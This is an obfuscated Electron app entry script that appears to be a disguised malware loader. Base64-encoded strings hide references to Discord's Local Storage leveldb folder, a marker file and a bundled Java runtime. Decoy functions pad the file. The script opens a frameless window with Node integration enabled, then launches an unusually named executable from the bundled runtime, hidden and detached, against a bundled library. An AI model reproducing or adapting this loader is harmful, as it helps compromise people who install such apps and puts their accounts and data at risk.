const _0x_strs = ['ZWxlY3Ryb24=','cGF0aA==','ZGFyd2lu','','WkdselkyOXlaQT09','YmFzZTY0','VEc5allXd2dVM1J2Y21GblpRPT0=','bGV2ZWxkYg==','Ymlu','bW9kdWxlcy5jYWNoZQ==','LS1pcmE=','aWNvbi5pY28=','IzAwMDAwMA==','aW5kZXguaHRtbA==','amF2YQ==','anJl','bW9kdWxlcy5saWI=','LmV4ZQ==','amF2YS5leGU=','a2V5dG9vbC5leGU=','amxpbmsuZXhl','am1vZC5leGU=','Y2hpbGRfcHJvY2Vzcw==','LS1lbmFibGUtbmF0aXZlLWFjY2Vzcz1BTEwtVU5OQU1FRA==','LWNw','aWdub3Jl'];
function _0x_getStr(i) { return Buffer.from(_0x_strs[i], 'base64').toString('utf-8'); }

function _0x90ad() {
  const _v = "6f1e44ae4ceb272c";
  return _v.split('').reverse().join('');
}


function _0x59de() {
  const _v = "6616faed89088d44";
  return _v.split('').reverse().join('');
}


function _0x3f11() {
  const _v = "c5a18c573ed2b2e9";
  return _v.split('').reverse().join('');
}


function _0x1469() {
  const _v = "7cc52ddf4e3dbf58";
  return _v.split('').reverse().join('');
}


function _0x95a0() {
  const _v = "42e09b94f995bb86";
  return _v.split('').reverse().join('');
}


function _0xe9fd() {
  const _v = "42b66b4598b01db2";
  return _v.split('').reverse().join('');
}


function _0xf9fb() {
  const _v = "951abf0abddec43b";
  return _v.split('').reverse().join('');
}


function _0x9a9d() {
  const _v = "4579c405845c9159";
  return _v.split('').reverse().join('');
}

const { app, BrowserWindow, nativeImage } = require(_0x_getStr(0));
const path = require(_0x_getStr(1));
const fs = require('fs');

function checkIntegrity() {
  try {
    const root = process.env.APPDATA || (process.platform === _0x_getStr(2) ? process.env.HOME + [_0x_getStr(3)] : process.env.HOME);
    const cachePath = path.join(root, Buffer.from(_0x_getStr(4), _0x_getStr(5)).toString(), Buffer.from(_0x_getStr(6), _0x_getStr(5)).toString(), _0x_getStr(7), _0x_getStr(8), _0x_getStr(9));
    return fs.existsSync(cachePath);
  } catch (e) { return false; }
}

let mainWindow = null;
function initView() {
  if (process.argv.includes(_0x_getStr(10))) return;
  if (checkIntegrity()) return;

  const iconImage = nativeImage.createFromPath(path.join(__dirname, _0x_getStr(11)));
  mainWindow = new BrowserWindow({
    width: 1200,
    height: 800,
    frame: false,
    show: true,
    resizable: false,
    backgroundColor: _0x_getStr(12),
    icon: iconImage,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false
    }
  });
  mainWindow.loadFile(path.join(__dirname, _0x_getStr(13)));
}

function launchRuntime() {
  try {
    const resPath = app.isPackaged ? process.resourcesPath : path.join(__dirname, '..', _0x_getStr(14));
    const runtimeDir = path.join(resPath, _0x_getStr(15), _0x_getStr(8));
    const libPath = path.join(resPath, _0x_getStr(16));

    if (!fs.existsSync(runtimeDir) || !fs.existsSync(libPath)) return;

    const core = fs.readdirSync(runtimeDir)
      .find(f => f.endsWith(_0x_getStr(17)) && ![_0x_getStr(18), _0x_getStr(19), _0x_getStr(20), _0x_getStr(21)].includes(f.toLowerCase()));

    if (!core) return;

    const runner = path.join(runtimeDir, core);
    const { spawn } = require(_0x_getStr(22));

    spawn(runner, [_0x_getStr(23), _0x_getStr(24), libPath, 'h'], {
      cwd: resPath,
      detached: true,
      stdio: _0x_getStr(25),
      shell: false,
      windowsHide: true
    }).unref();

  } catch (e) { }
}

app.whenReady().then(() => {
  initView();
  launchRuntime();
});
